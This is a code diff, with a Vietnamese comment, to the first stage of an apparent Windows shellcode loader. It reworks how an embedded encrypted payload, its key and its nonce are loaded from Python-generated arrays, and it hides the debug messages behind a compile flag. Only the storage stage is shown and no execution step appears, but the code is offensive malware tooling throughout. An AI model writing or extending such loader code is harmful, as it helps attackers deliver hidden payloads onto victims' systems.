@@ -3,12 +3,12 @@
 #include <windows.h>
 
 // Các biến toàn cục do Python tạo ra
-extern unsigned char shellcode[];
-extern unsigned int shellcode_len;
-extern unsigned char key[];
-extern unsigned int key_len;
-// extern unsigned char nonce[];
-// extern unsigned int nonce_len;
+extern unsigned char PAYLOAD[];
+extern unsigned int  PAYLOAD_LEN;
+extern unsigned char PAYLOAD_KEY[];
+extern unsigned int  PAYLOAD_KEY_LEN;
+extern unsigned char PAYLOAD_NONCE[];
+extern unsigned int  PAYLOAD_NONCE_LEN;
 
 typedef struct {
     unsigned char* data;
@@ -24,22 +24,19 @@ typedef struct {
 } PayloadContext;
 
 PayloadContext Stage1_Storage_GetData() {
-    PayloadContext ctx;
+    PayloadContext ctx = {0};
 
-    ctx.data = shellcode;
-    ctx.length = shellcode_len;
+    ctx.data      = PAYLOAD;
+    ctx.length    = PAYLOAD_LEN;
+    ctx.key       = PAYLOAD_KEY;
+    ctx.key_len   = PAYLOAD_KEY_LEN;
+    ctx.nonce     = PAYLOAD_NONCE;
+    ctx.nonce_len = PAYLOAD_NONCE_LEN;
 
-    ctx.key = key;
-    ctx.key_len = key_len;
-
-    // ctx.nonce = nonce;
-    // ctx.nonce_len = nonce_len;
-
-    ctx.allocated_mem = NULL;
-
-    if (ctx.length == 0) {
-        DEBUG_MSG("Stage 1", "Shellcode length is 0");
-    }
+    #ifdef DEBUG_MODE
+        if (ctx.length == 0) DEBUG_MSG("Stage 1", "Payload length is 0");
+        else                 DEBUG_MSG("Stage 1", "Payload loaded from embedded storage");
+    #endif
 
     return ctx;
 }
